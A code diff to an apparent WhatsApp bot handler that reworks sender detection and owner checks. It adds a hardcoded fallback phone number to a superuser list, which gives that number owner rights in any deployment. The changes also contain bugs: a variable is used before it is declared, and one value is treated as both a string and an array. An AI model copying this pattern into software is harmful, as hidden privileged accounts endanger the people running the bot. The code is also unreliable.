@@ -69,6 +69,27 @@ console.log(prefix);
     var budy = typeof m.text == "string" ? m.text : "";
 	  var msgR = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
 //========================================================================================================================//
+	  function standardizeJid(jid) {
+        if (!jid) return '';
+        try {
+            jid = typeof jid === 'string' ? jid : 
+                (jid.decodeJid ? jid.decodeJid() : String(jid));
+            jid = jid.split(':')[0].split('/')[0];
+            if (!jid.includes('@')) {
+                jid += '@s.whatsapp.net';
+            } else if (jid.endsWith('@lid')) {
+                return jid.toLowerCase();
+            }
+            return jid.toLowerCase();
+        } catch (e) {
+            console.log("JID standardization error:", e);
+            return '';
+        }
+	  }
+
+	  const sendr = mek.key.fromMe 
+        ? (client.user.id.split(':')[0] + '@s.whatsapp.net' || client.user.id) 
+        : (mek.key.participantPn || mek.key.senderPn || mek.key.participant || mek.key.remoteJid);
 //========================================================================================================================//	  
     const Heroku = require("heroku-client");  
     const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
@@ -82,7 +103,7 @@ console.log(prefix);
     m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
     const from = m.chat;
     const reply = m.reply;
-    const sender = m.sender;
+    const sender = sendr;
     const mek = chatUpdate.messages[0];
     const getGroupAdmins = (participants) => { 
        let admins = []; 
@@ -92,6 +113,22 @@ console.log(prefix);
        return admins || []; 
      };
 //========================================================================================================================//
+	  const ownerJid = dev && typeof dev === 'string' 
+        ? standardizeJid(dev.replace(/\D/g, ''))
+        : standardizeJid('254780147229');
+
+    // Create superUser array safely
+    const superUser = [
+        ownerJid,
+        itsMe,
+        ...dev.map(num => `${num}@s.whatsapp.net`)
+    ].map(jid => standardizeJid(jid)).filter(Boolean);
+
+    const superUserSet = new Set(superUser);
+    const finalSuperUsers = Array.from(superUserSet);
+
+    const Owner = finalSuperUsers.includes(standardizeJid(sender));
+
 //========================================================================================================================//	  
     const nicki = (m.quoted || m); 
     const quoted = (nicki.mtype == 'buttonsMessage') ? nicki[Object.keys(nicki)[1]] : (nicki.mtype == 'templateMessage') ? nicki.hydratedTemplate[Object.keys(nicki.hydratedTemplate)[1]] : (nicki.mtype == 'product') ? nicki[Object.keys(nicki)[0]] : m.quoted ? m.quoted : m; 
@@ -129,7 +166,7 @@ console.log(prefix);
     })()
   : sender;
      const isAdmin = m.isGroup ? groupAdmin.includes(groupSender) : false;
-     const Owner = owner.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(groupSender)
+     
      const maindev = '254114283550';
      const maindev2 = maindev.split(",");
      const date = new Date()  
